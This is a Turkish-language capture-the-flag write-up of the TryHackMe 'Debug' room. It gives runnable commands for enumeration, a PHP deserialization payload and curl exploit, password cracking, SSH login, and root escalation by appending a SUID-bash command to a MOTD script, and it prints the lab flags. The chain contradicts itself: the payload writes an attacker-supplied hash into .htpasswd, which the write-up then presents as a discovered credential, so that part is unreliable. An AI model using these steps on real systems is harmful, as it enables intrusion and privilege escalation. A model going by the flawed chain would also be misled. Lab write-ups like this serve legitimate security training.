# 🐛 Debug — TryHackMe Writeup



![Zorluk](https://img.shields.io/badge/Zorluk-Orta-orange)

![Kategori](https://img.shields.io/badge/Kategori-Web%20|%20PHP%20Deserialization%20|%20MOTD%20Poisoning-blue)

![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)



> **Yazar:** Miraç Akkuş (LatenT)  

> **Tarih:** Mayıs 2026  

> **Oda:** [Debug](https://tryhackme.com/room/debug)



---



## 📋 Yönetici Özeti



Bu write-up, **Debug** makinesinin tam sömürülmesini belgelemektedir. Saldırı zinciri, PHP `unserialize()` zafiyetinden yararlanarak gizli `.htpasswd` dosyasına erişim, hash kırma ile SSH kimlik bilgileri elde etme ve son olarak yazılabilir MOTD (Message of the Day) scriptlerini zehirleyerek root yetkisine yükselme adımlarını kapsamaktadır.



---



## 🛠️ Kullanılan Araçlar ve Teknolojiler



| Araç | Amaç |

|------|------|

| `nmap` | Ağ keşfi ve servis enumerasyonu |

| `gobuster` / `ffuf` | Dizin ve dosya keşfi |

| `php` | Özel deserialization payload oluşturma |

| `john` | Parola hash kırma |

| `ssh` | Uzaktan erişim |

| `nc` | Ters kabuk dinleyicisi |



---



## 🔍 Aşama 1: Keşif ve Bilgi Toplama



### Ağ Taraması



```bash

nmap -sV -sC -T4 <YOUR_MACHINE_IP>

```



### Bulgular



| Port | Durum | Servis | Versiyon |

|------|-------|--------|----------|

| 22/tcp | açık | SSH | OpenSSH |

| 80/tcp | açık | HTTP | Apache httpd 2.4.18 |



### Dizin Enumerasyonu



```bash

gobuster dir -u http://<YOUR_MACHINE_IP> -w /usr/share/wordlists/dirb/common.txt

```



**Keşfedilen Dizinler:**



| Dizin | İçerik | Önem |

|-------|--------|------|

| `/backup` | Yedek dosyalar | Kaynak kod sızıntısı |

| `/grid` | Grid arayüzü | Potansiyel saldırı yüzeyi |

| `/javascripts` | JS dosyaları | İnceleme gerektirir |



### Kaynak Kod Analizi



`/backup/index.php.bak` dosyası incelendi:



```php

<?php

class FormSubmit {

    public $form_file = 'message.txt';

    public $message = 'Test';

    

    public function __destruct() {

        file_put_contents($this->form_file, $this->message);

    }

}



// ... deserialization logic ...

$data = unserialize($_GET['debug']);

?>

```



**Kritik Zafiyet:** `unserialize()` kullanıcı kontrollü girdi ile çağrılıyor. `__destruct()` metodu `file_put_contents()` ile keyfi dosya yazma imkanı tanıyor.



---



## 🎯 Aşama 2: PHP Insecure Deserialization



### Payload Oluşturma



```php

<?php

class FormSubmit {

    public $form_file = '.htpasswd';

    public $message = 'james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1';

}



$payload = serialize(new FormSubmit());

echo urlencode($payload);

?>

```



### Exploit



```bash

curl "http://10.113.140.151/?debug=O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A9%3A%22.htpasswd%22%3Bs%3A7%3A%22message%22%3Bs%3A37%3A%22james%3A%24apr1%24zPZMix2A%24d8fBXH0em33bfI9UTt9Nq1%22%3B%7D"

```



### .htpasswd Okuma



```bash

curl http://<YOUR_MACHINE_IP>/.htpasswd

```



**Bulgu:**

```

james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1

```



### Hash Kırma



```bash

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

```



**Sonuç:** `jamaica`



---



## 🐚 Aşama 3: SSH Erişimi ve Kullanıcı Flag'i



### SSH Girişi



```bash

ssh james@10.113.140.151

# Password: jamaica

```



### Kullanıcı Flag'i



```bash

cat /home/james/user.txt

```



**Kullanıcı Flag'i:** `THM{7e37c84a66cc40b1c6bf700d08d28c20}`



---



## 🚀 Aşama 4: Yetki Yükseltme (MOTD Poisoning)



### Dahili Keşif



```bash

cat /home/james/Note-To-James.txt

```



**İçerik:**

> *"James, MOTD mesajlarını düzenleme yetkisini aldın. Lütfen sisteme girişte hoş bir mesaj göster."*



### MOTD Dizin Analizi



```bash

ls -la /etc/update-motd.d/

```



**Bulgu:** `00-header` dosyası `james` grubuna yazılabilir.



### Script Zehirleme



```bash

echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /etc/update-motd.d/00-header

```



### Tetikleme



Yeni SSH oturumu açarak MOTD scripti çalıştırılır:



```bash

ssh james@10.113.140.151

# Çıkış yap

```



### Root Kabuğu



```bash

/tmp/rootbash -p

# euid=0(root)

```



### Root Flag'i



```bash

cat /root/root.txt

```



**Root Flag'i:** `THM{3c8c3d0fe758c320d158e32f68fabf4b}`



---



## 🗺️ Saldırı Yolu Görselleştirmesi



```

[Saldırgan]

    │

    ├───nmap───► [Hedef: 22, 80]

    │                │

    │                ▼

    │        [gobuster: /backup, /grid, /javascripts]

    │                │

    │                ▼

    │        [/backup/index.php.bak]

    │                │

    │                ▼

    │        [unserialize() + __destruct() analizi]

    │                │

    │                ▼

    │        [Özel payload: .htpasswd yazma]

    │                │

    │                ▼

    │        [.htpasswd okuma: james:$apr1$...]

    │                │

    │                ▼

    │        [john: jamaica]

    │                │

    │                ▼

    │        [SSH: james:jamaica]

    │                │

    │                ▼

    │        [Kullanıcı Flag'i]

    │                │

    │                ▼

    │        [Note-To-James.txt: MOTD yetkisi]

    │                │

    │                ▼

    │        [/etc/update-motd.d/00-header yazılabilir]

    │                │

    │                ▼

    │        [SUID bash enjeksiyonu]

    │                │

    │                ▼

    │        [Yeni SSH oturumu → MOTD tetikleme]

    │                │

    │                ▼

    └────────► [Root kabuğu + Root Flag'i]

```



---



## 🛡️ Zafiyet Değerlendirmesi ve Çözümler



| # | Zafiyet | Şiddet | CVSS | Çözüm |

|---|---------|--------|------|-------|

| 1 | **PHP Insecure Deserialization** | 🔴 Kritik | 9.8 | `unserialize()` yerine `json_decode()` kullan; nesne oluşturmayı devre dışı bırak; girdi doğrulama |

| 2 | **Yedek Dosya Maruziyeti** | 🟠 Yüksek | 7.5 | `.bak` dosyalarını web kökünden kaldır; dizin listelemeyi kapat |

| 3 | **Zayıf Parola Hash'i** | 🟠 Yüksek | 7.0 | bcrypt/Argon2 kullan; güçlü parola politikası |

| 4 | **Yazılabilir MOTD Scriptleri** | 🔴 Kritik | 9.0 | MOTD dosyalarını root sahipliğinde tut; `james` grubundan çıkar |

| 5 | **SUID Binary Oluşturma** | 🔴 Kritik | 9.0 | AppArmor/SELinux ile kısıtla; yazılabilir dizinleri izle |



---



## 🎓 Temel Çıkarımlar



1. **Yedek Dosyalar:** `.bak`, `.old`, `.zip` uzantıları sıklıkla kaynak kod sızıntısı içerir

2. **Magic Methods:** PHP'de `__destruct()`, `__wakeup()` gibi metotlar deserialization zincirinde kritik

3. **File Put Contents:** `unserialize()` ile `file_put_contents()` kombinasyonu klasik RCE vektörüdür

4. **MOTD Poisoning:** Sık gözden kaçan yetki yükseltme yolu; her zaman izinleri kontrol et

5. **Group Ownership:** `james` grubunun yazma yetkisi, root dosyalarını tehlikeye atar



---



## 📁 Depo Yapısı



```

.

├── README.md

├── nmap/

│   └── debug_scan.nmap

├── exploits/

│   ├── deserialize_payload.php

│   └── motd_poison.sh

├── credentials/

│   └── htpasswd_crack.txt

└── screenshots/

    ├── backup_directory.png

    ├── source_code.png

    ├── john_crack.png

    ├── ssh_login.png

    ├── motd_permissions.png

    └── root_shell.png

```



---



## 🚩 Flag'ler



| Flag | Konum | Değer |

|------|-------|-------|

| **Kullanıcı Flag'i** | `/home/james/user.txt` | `THM{7e37c84...2c20}` |

| **Root Flag'i** | `/root/root.txt` | `THM{3c8c3d0...ab4b}` |



---



> **⚠️ Yasal Uyarı:** Bu write-up sadece eğitim ve araştırma amaçlıdır. Sahibi olmadığınız sistemleri test etmeden önce her zaman açık yazılı yetki alın.



---



**Yazar:** Miraç Akkuş (LatenT)  

**Tarih:** Mayıs 2026
